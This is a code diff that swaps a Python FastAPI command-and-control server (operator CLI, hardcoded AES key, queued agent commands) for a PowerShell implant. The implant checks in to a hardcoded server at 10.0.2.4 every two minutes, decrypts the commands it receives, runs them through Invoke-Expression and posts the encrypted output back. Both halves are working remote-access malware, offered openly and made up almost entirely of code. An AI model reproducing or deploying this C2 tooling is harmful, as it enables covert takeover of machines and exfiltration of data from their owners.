@@ -1,152 +1,194 @@
-from fastapi import FastAPI, HTTPException
-import json
-from pydantic import BaseModel
-from typing import Dict
-import typer
-import logging
-import base64
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import subprocess
-import os
-import uvicorn
-import threading
-import time
+$LogDir = "C:\c2_Log"
+$LogFile = "$LogDir\logfile.txt"
+$AgentIDFile = "$LogDir\AgentID.txt"
 
-app = FastAPI()
-cli = typer.Typer()
-agents: Dict[str, Dict] = {}
+Function Log-Message {
+    param (
+        [string]$Message
+    )
+    if (-not (Test-Path -Path $LogDir)) {
+        New-Item -Path $LogDir -ItemType Directory
+    }
+    $Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+    $LogEntry = "$Timestamp - $Message"
+    Add-Content -Path $LogFile -Value $LogEntry
+}
 
-logging.basicConfig(filename="c2_server.log", level=logging.INFO)
+Function Get-EncryptionKey {
+    param ([string]$Base64Key)
+    Log-Message "Getting encryption key from Base64 string: $Base64Key"
 
-class CheckinRequest(BaseModel):
-    AgentID: str
+    try {
+        $KeyBytes = [System.Convert]::FromBase64String($Base64Key)
+    } catch {
+        Log-Message "Error converting Base64 string to byte array: $_"
+        throw "Invalid key format."
+    }
 
-class ResultRequest(BaseModel):
-    AgentID: str
-    Result: str
+    if ($KeyBytes.Length -ne 16 -and $KeyBytes.Length -ne 32) {
+        throw "Invalid key size. Expected 128-bit (16 bytes) or 256-bit (32 bytes)."
+    }
+    Log-Message "Encryption key obtained successfully."
+    return $KeyBytes
+}
 
-class CommandRequest(BaseModel):
-    AgentID: str
-    Command: str
+Function Encrypt-Data {
+    param (
+        [string]$Data,
+        [byte[]]$Key
+    )
+    try {
+        Log-Message "Starting encryption..."
+        $Aes = [System.Security.Cryptography.AesManaged]::new()
+        $Aes.Key = $Key
+        $Aes.GenerateIV()
+        $Encryptor = $Aes.CreateEncryptor($Aes.Key, $Aes.IV)
 
-# Load AES Key (Ensure it is 32 bytes for AES-256)
-key_b64 = "ywD3S70cYF56DLw3GHYA9MzCflWAMcljQKoeKXbanqc="  # Replace with your actual key
-key = base64.b64decode(key_b64)
+        $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
+        $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
 
-def check_key_length(key: bytes) -> bytes:
-    if len(key) not in [16, 24, 32]:
-        raise ValueError(f"Incorrect AES key length ({len(key)} bytes)")
-    return key
+        Log-Message "Data encrypted successfully."
+        return $Aes.IV + $EncryptedBytes  # Raw binary output
+    } catch {
+        Log-Message "Error in Encrypt-Data: $_"
+        throw
+    }
+}
 
-def encrypt_data(data: str, key: bytes) -> str:
-    key = check_key_length(key)
-    cipher = AES.new(key, AES.MODE_CBC)
-    iv = cipher.iv
-    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
-    encrypted_data = base64.b64encode(iv + ct_bytes).decode('utf-8')
-    return encrypted_data
+Function Decrypt-Data {
+    param (
+        [byte[]]$Data,
+        [byte[]]$Key
+    )
+    try {
+        Log-Message "Starting decryption..."
+        $Aes = [System.Security.Cryptography.AesManaged]::new()
+        $Aes.Key = $Key
+        $IV = $Data[0..15]
+        $EncryptedBytes = $Data[16..($Data.Length - 1)]
 
-def decrypt_data(data: str, key: bytes) -> str:
-    key = check_key_length(key)
-    try:
-        raw_data = base64.b64decode(data)
-        iv, ct = raw_data[:16], raw_data[16:]
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        pt = unpad(cipher.decrypt(ct), AES.block_size)
-        return pt.decode('utf-8')
-    except Exception as e:
-        logging.error(f"Decryption failed: {str(e)}")
-        raise HTTPException(status_code=400, detail="Decryption failed")
+        $Decryptor = $Aes.CreateDecryptor($Aes.Key, $IV)
+        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
 
-@app.post("/checkin")
-def checkin(request: CheckinRequest):
-    agent_id = request.AgentID
-    if agent_id not in agents:
-        agents[agent_id] = {"commands": []}
-        logging.info(f"New agent registered: {agent_id}")
+        Log-Message "Data decrypted successfully."
+        return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
+    } catch {
+        Log-Message "Error in Decrypt-Data: $_"
+        throw
+    }
+}
 
-    if agents[agent_id]["commands"]:
-        command = agents[agent_id]["commands"].pop(0)
-        response = encrypt_data(command, key)
-    else:
-        response = encrypt_data("NoCommand", key)
+Function Check-In {
+    param (
+        [string]$ServerURL,
+        [string]$AgentID,
+        [byte[]]$Key
+    )
+    try {
+        Log-Message "Starting check-in process..."
+        $Body = @{ AgentID = $AgentID } | ConvertTo-Json
+        Log-Message "Sending check-in request to $ServerURL"
+        $Response = Invoke-RestMethod -Uri "$ServerURL/checkin" -Method Post -Body $Body -ContentType "application/json"
+        Log-Message "Received check-in response: $($Response | ConvertTo-Json -Depth 100)"
 
-    return {"key": key_b64, "data": response}
+        if ($null -eq $Response.key -or [string]::IsNullOrEmpty($Response.key)) {
+            throw "Received empty HexKey from server."
+        }
 
-@app.post("/result")
-def result(request: ResultRequest):
-    agent_id = request.AgentID
-    try:
-        result = decrypt_data(request.Result, key)
-    except HTTPException:
-        raise HTTPException(status_code=400, detail="Decryption failed")
+        $Base64Key = $Response.key
+        Log-Message "Received Base64Key: $Base64Key"
 
-    if agent_id not in agents:
-        raise HTTPException(status_code=404, detail="Agent not found")
+        $Key = Get-EncryptionKey -Base64Key $Base64Key
+        Log-Message "Encryption key obtained."
 
-    logging.info(f"Agent {agent_id} executed command with result: {result}")
-    return {"Status": "OK"}
+        return $Key, $Response.data
+    } catch {
+        Log-Message "Error in Check-In: $_"
+        throw
+    }
+}
 
-@app.get("/list_agents")
-def list_agents():
-    return {"agents": [{"AgentID": agent_id} for agent_id in agents]}
+Function Send-Result {
+    param (
+        [string]$ServerURL,
+        [string]$AgentID,
+        [string]$Result,
+        [byte[]]$Key
+    )
+    try {
+        Log-Message "Encrypting result..."
+        $EncryptedResult = Encrypt-Data -Data $Result -Key $Key
+        $Body = @{
+            AgentID = $AgentID
+            Result = [System.Convert]::ToBase64String($EncryptedResult)
+        } | ConvertTo-Json
+        Log-Message "Sending result to $ServerURL"
+        Invoke-RestMethod -Uri "$ServerURL/result" -Method Post -Body $Body -ContentType "application/json"
+        Log-Message "Result sent successfully."
+    } catch {
+        Log-Message "Error in Send-Result: $_"
+        throw
+    }
+}
 
-@app.post("/sendcommand")
-def send_command(request: CommandRequest):
-    agent_id = request.AgentID
-    command = request.Command
-    if agent_id in agents:
-        agents[agent_id]["commands"].append(command)
-        logging.info(f"Command sent to agent {agent_id}: {command}")
-        return {"Status": "Command sent"}
-    raise HTTPException(status_code=404, detail="Agent not found")
+Function Execute-Command {
+    param (
+        [string]$ServerURL,
+        [string]$AgentID,
+        [byte[]]$Key,
+        [string]$Command
+    )
+    try {
+        Log-Message "Decrypting command..."
+        $DecryptedCommand = Decrypt-Data -Data ([System.Convert]::FromBase64String($Command)) -Key $Key
+        if ($DecryptedCommand -ne "NoCommand") {
+            Log-Message "Executing command: $DecryptedCommand"
+            $Result = Invoke-Expression -Command $DecryptedCommand
+            Log-Message "Command execution result: $Result"
+            Log-Message "Sending result..."
+            Send-Result -ServerURL $ServerURL -AgentID $AgentID -Result $Result -Key $Key
+        } else {
+            Log-Message "No commands to execute."
+        }
+    } catch {
+        Log-Message "Error in Execute-Command: $_"
+    }
+}
 
-@cli.command("list-agents")
-def list_agents_cli():
-    for agent_id in agents:
-        typer.echo(f"Agent ID: {agent_id}, Pending Commands: {len(agents[agent_id]['commands'])}")
+Function Main-Loop {
+    param (
+        [string]$ServerURL,
+        [string]$AgentID,
+        [byte[]]$Key
+    )
+    while ($true) {
+        try {
+            Log-Message "Checking in..."
+            $Key, $Command = Check-In -ServerURL $ServerURL -AgentID $AgentID -Key $Key
+            Execute-Command -ServerURL $ServerURL -AgentID $AgentID -Key $Key -Command $Command
+            Log-Message "Sleeping for 120 seconds..."
+            Start-Sleep -Seconds 120
+        } catch {
+            Log-Message "Error in main loop: $_"
+        }
+    }
+}
 
-@cli.command("select-agent")
-def select_agent():
-    agent_ids = list(agents.keys())
-    if not agent_ids:
-        typer.echo("No agents available.")
-        return
-
-    agent_choice = typer.prompt("Select an agent", type=typer.Choice(agent_ids))
-
-    while True:
-        command = typer.prompt(f"Enter command to send to agent {agent_choice} (or 'exit' to stop)")
-        if command.lower() == "exit":
-            break
-        if agent_choice in agents:
-            agents[agent_choice]["commands"].append(command)
-            typer.echo(f"Command '{command}' sent to agent {agent_choice}")
-        else:
-            typer.echo(f"Agent {agent_choice} not found")
-
-@cli.command("generate-report")
-def generate_report():
-    with open('c2_server.log', 'r') as log_file:
-        report = log_file.read()
-    with open('report.txt', 'w') as report_file:
-        report_file.write(report)
-    typer.echo("Report generated as report.txt")
-
-def run_server():
-    uvicorn.run(app, host="0.0.0.0", port=8000)
-
-def start_server_and_cli():
-    # Start the server in a separate thread
-    server_thread = threading.Thread(target=run_server)
-    server_thread.start()
-
-    # Allow some time for the server to start
-    time.sleep(3)
-
-    # Run the CLI
-    cli()
-
-if __name__ == "__main__":
-    start_server_and_cli()
+# Main script logic
+try {
+    if (-not (Test-Path -Path $LogDir)) {
+        New-Item -Path $LogDir -ItemType Directory
+    }
+    $ServerURL = "http://10.0.2.4:8000"
+    if (-not (Test-Path -Path $AgentIDFile)) {
+        $AgentID = [guid]::NewGuid().ToString()
+        $AgentID | Out-File -FilePath $AgentIDFile
+    } else {
+        $AgentID = Get-Content -Path $AgentIDFile
+    }
+    Log-Message "Using AgentID: $AgentID"
+    $Key = $null
+    Main-Loop -ServerURL $ServerURL -AgentID $AgentID -Key $Key
+} catch {
+    Log-Message "An error occurred in the main script: $_"
+}
